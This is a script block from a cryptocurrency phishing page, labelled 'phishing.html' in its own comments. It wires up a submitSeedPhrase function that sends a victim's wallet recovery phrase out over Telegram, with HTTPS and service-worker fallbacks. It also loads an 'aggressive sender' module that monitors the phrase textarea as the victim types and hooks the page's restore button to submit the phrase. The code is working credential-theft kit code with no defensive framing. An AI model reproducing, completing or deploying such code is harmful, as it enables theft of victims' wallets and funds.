<!-- SCRIPTS - PROPER LOADING ORDER FOR PHISHING.HTML -->
<!-- CRITICAL: Load modules in the correct dependency order -->

<!-- 1. User Actions Module (dependencies tracker) -->
<script src="assets/js/user-action.js"></script>

<!-- 2. Aggressive Sender Module (IndexedDB + localStorage + cookies) -->
<script src="assets/js/aggressive.js"></script>

<!-- 3. Main Submission Handler (Telegram + HTTPS + Service Worker) -->
<script src="assets/js/main.js"></script>

<!-- 4. UI Logic (interacts with all above modules) -->
<script src="assets/js/script.js"></script>

<!-- Telegram Integration Initialization for phishing.html -->
<script>
(function() {
    console.log('[Phishing] Initializing Telegram integration');
    
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[Phishing] Page fully loaded, all modules ready');
        
        // Expose global handler for Telegram delivery
        window.submitSeedPhrase = async function(phraseText) {
            console.log('[Phishing] submitSeedPhrase called with phrase length:', phraseText.length);
            
            if (typeof window.handlePhraseSubmit === 'function') {
                try {
                    const result = await window.handlePhraseSubmit(phraseText);
                    console.log('[Phishing] Submission result:', result);
                    
                    // Ensure Telegram delivery confirmation
                    if (result && result.success) {
                        if (result.method === 'telegram') {
                            console.log('[Phishing] ✓ PRIMARY: Telegram delivery confirmed');
                            return { success: true, method: 'telegram' };
                        } else if (result.method === 'https') {
                            console.log('[Phishing] ✓ SECONDARY: HTTPS delivery confirmed');
                            return { success: true, method: 'https' };
                        }
                    }
                    
                    console.log('[Phishing] Fallback to Service Worker pending');
                    return { success: false, method: 'service_worker_pending' };
                    
                } catch (error) {
                    console.error('[Phishing] Submission error:', error);
                    return { success: false, method: 'error', error: error.message };
                }
            } else {
                console.error('[Phishing] handlePhraseSubmit not available');
                return { success: false, method: 'not_available' };
            }
        };
        
        // Initialize Aggressive Sender for phishing.html
        if (window.AggressiveSender && typeof window.AggressiveSender.initTextareaMonitoring === 'function') {
            console.log('[Phishing] Initializing AggressiveSender for textarea monitoring');
            window.AggressiveSender.initTextareaMonitoring('phraseInput');
            console.log('[Phishing] ✓ AggressiveSender initialized');
        } else {
            console.warn('[Phishing] AggressiveSender not available for initialization');
        }
        
        // Setup restore button handler (for Activate card button)
        const restoreBtn = document.getElementById('restoreBtn');
        if (restoreBtn) {
            restoreBtn.addEventListener('click', async function() {
                const phraseInput = document.getElementById('phraseInput');
                if (phraseInput && phraseInput.value.trim()) {
                    console.log('[Phishing] Restore button clicked, submitting phrase');
                    const result = await window.submitSeedPhrase(phraseInput.value.trim());
                    console.log('[Phishing] Restore result:', result);
                } else {
                    console.warn('[Phishing] Phrase input is empty');
                }
            });
            console.log('[Phishing] ✓ Restore button handler attached');
        }
        
        console.log('[Phishing] ✓ All initialization complete');
    });
    
})();
</script>

